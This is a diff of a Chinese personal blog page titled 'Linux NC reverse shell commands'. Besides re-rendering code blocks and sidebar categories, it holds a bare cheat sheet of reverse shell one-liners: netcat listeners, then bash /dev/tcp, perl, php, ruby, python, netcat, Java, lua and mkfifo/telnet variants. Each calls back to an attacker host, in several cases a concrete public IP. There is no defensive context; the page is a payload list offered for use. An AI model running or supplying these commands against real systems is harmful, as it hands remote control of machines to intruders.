@@ -7,8 +7,8 @@
   <title>Linux下NC反弹shell命令 | 芯机智</title>
   
   
-  <meta name="description" content="本机开启监听： nc -lvnp 4444 nc -vvlp 4444 目标机器开启反弹 bash版本： bash -i >&
-/dev/tcp/10.0.0.1/8080 0>&1 perl版本： perl -e 'use Socket;$">
+  <meta name="description" content="本机开启监听： 12 nc -lvnp 4444nc -vvlp 4444 目标机器开启反弹 bash版本： 1 bash -i >&
+/dev/tcp/10.0.0.1/8080 0>&1 perl版本： 1 perl -e 'use S">
   
 
   
@@ -272,9 +272,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/SYSTEM/' rel="nofollow">
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>SYSTEM</p>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
     </a>
   </div>
 
@@ -315,43 +315,25 @@
       <section class="article typo">
         <div class="article-entry" itemprop="articleBody">
           <p>本机开启监听：</p>
-<pre><code>nc -lvnp 4444
-nc -vvlp 4444
-</code></pre><p>目标机器开启反弹<br>bash版本：</p>
-<pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div><div class="line">nc -vvlp 4444</div></pre></td></tr></table></figure>
+<p>目标机器开启反弹<br>bash版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
 <p>perl版本：</p>
-<pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</div></pre></td></tr></table></figure>
 <p>php版本：</p>
-<pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</div></pre></td></tr></table></figure>
 <p>ruby版本：</p>
-<pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</div></pre></td></tr></table></figure>
 <p>python版本：</p>
-<pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div></pre></td></tr></table></figure>
 <p>nc版本：</p>
-<pre><code class="shell">nc -e /bin/sh 10.0.0.1 1234
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
-nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 1234</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div></pre></td></tr></table></figure>
 <p>java版本：</p>
-<pre><code class="shell">r = Runtime.getRuntime()
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
-p.waitFor()
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
 <p>lua版本：</p>
-<pre><code class="shell">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</div></pre></td></tr></table></figure>
 <p>NC版本不使用-e参数：</p>
-<pre><code class="shell">mknod /tmp/backpipe p
-/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe
-/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1
-
-mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div><div class="line">/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe</div><div class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</div><div class="line"></div><div class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</div></pre></td></tr></table></figure>
 
         </div>
         
@@ -387,19 +369,22 @@ mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
           
           href="http://connect.qq.com/widget/shareqq/index.html?url=http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html&title=Linux下NC反弹shell命令 | 芯机智&summary=本机开启监听：
 
-nc -lvnp 4444
-nc -vvlp 4444
+12
 
+nc -lvnp 4444nc -vvlp 4444
 
 目标机器开启反弹
 bash版本：
 
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+1
 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 perl版本：
 
-perl -e 'use Socket;$"
+1
+
+perl -e 'use S"
           
           >
           
@@ -413,19 +398,22 @@ perl -e 'use Socket;$"
           
           href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html&title=Linux下NC反弹shell命令 | 芯机智&summary=本机开启监听：
 
-nc -lvnp 4444
-nc -vvlp 4444
+12
 
+nc -lvnp 4444nc -vvlp 4444
 
 目标机器开启反弹
 bash版本：
 
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+1
 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 perl版本：
 
-perl -e 'use Socket;$"
+1
+
+perl -e 'use S"
           
           >
           
@@ -439,19 +427,22 @@ perl -e 'use Socket;$"
           
           href="http://service.weibo.com/share/share.php?url=http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html&title=Linux下NC反弹shell命令 | 芯机智&summary=本机开启监听：
 
-nc -lvnp 4444
-nc -vvlp 4444
+12
 
+nc -lvnp 4444nc -vvlp 4444
 
 目标机器开启反弹
 bash版本：
 
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+1
 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 perl版本：
 
-perl -e 'use Socket;$"
+1
+
+perl -e 'use S"
           
           >
           
@@ -716,25 +707,37 @@ perl -e 'use Socket;$"
         
           <li><a class="flat-box" title="/categories/DEVELOP/" href="/categories/DEVELOP/"><div class='name'>DEVELOP</div><div class='badge'>(4)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/EMBEDDED/" href="/categories/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(95)</div></a></li>
+          <li><a class="flat-box child" title="/categories/DEVELOP/DEVELOP/" href="/categories/DEVELOP/DEVELOP/"><div class='name'>DEVELOP</div><div class='badge'>(4)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/EMBEDDED/" href="/categories/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(15)</div></a></li>
         
           <li><a class="flat-box child" title="/categories/EMBEDDED/mini2440/" href="/categories/EMBEDDED/mini2440/"><div class='name'>mini2440</div><div class='badge'>(3)</div></a></li>
         
           <li><a class="flat-box" title="/categories/LIVE/" href="/categories/LIVE/"><div class='name'>LIVE</div><div class='badge'>(3)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/NETWORK/" href="/categories/NETWORK/"><div class='name'>NETWORK</div><div class='badge'>(12)</div></a></li>
+          <li><a class="flat-box child" title="/categories/LIVE/LIVE/" href="/categories/LIVE/LIVE/"><div class='name'>LIVE</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/NETWORK/" href="/categories/NETWORK/"><div class='name'>NETWORK</div><div class='badge'>(11)</div></a></li>
         
           <li><a class="flat-box" title="/categories/SYSTEM/" href="/categories/SYSTEM/"><div class='name'>SYSTEM</div><div class='badge'>(12)</div></a></li>
         
+          <li><a class="flat-box child" title="/categories/SYSTEM/SYSTEM/" href="/categories/SYSTEM/SYSTEM/"><div class='name'>SYSTEM</div><div class='badge'>(9)</div></a></li>
+        
           <li><a class="flat-box" title="/categories/VPN系列之五花八门/" href="/categories/VPN系列之五花八门/"><div class='name'>VPN系列之五花八门</div><div class='badge'>(2)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/arm/" href="/categories/arm/"><div class='name'>arm</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box child" title="/categories/VPN系列之五花八门/VPN系列之五花八门/" href="/categories/VPN系列之五花八门/VPN系列之五花八门/"><div class='name'>VPN系列之五花八门</div><div class='badge'>(2)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/embedded/" href="/categories/embedded/"><div class='name'>embedded</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box" title="/categories/arm/" href="/categories/arm/"><div class='name'>arm</div><div class='badge'>(78)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/linux/" href="/categories/linux/"><div class='name'>linux</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box child" title="/categories/arm/EMBEDDED/" href="/categories/arm/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(78)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/笑看人生/" href="/categories/笑看人生/"><div class='name'>笑看人生</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box" title="/categories/linux/" href="/categories/linux/"><div class='name'>linux</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box child" title="/categories/linux/EMBEDDED/" href="/categories/linux/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/笑看人生/" href="/categories/笑看人生/"><div class='name'>笑看人生</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box child" title="/categories/笑看人生/EMBEDDED/" href="/categories/笑看人生/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(1)</div></a></li>
         
       </ul>
     </div>
@@ -748,27 +751,6 @@ perl -e 'use Socket;$"
           
           
             
-  <section class='widget tagcloud'>
-    
-<header class='pure'>
-  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
-  
-    <a class="rightBtn"
-    
-      rel="nofollow"
-    
-    
-    href="/blog/tags/"
-    title="blog/tags/">
-    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
-  
-</header>
-
-    <div class='content pure'>
-      <a href="/tags/linux/" style="font-size: 14px; color: #999">linux</a>
-    </div>
-  </section>
-
 
           
         
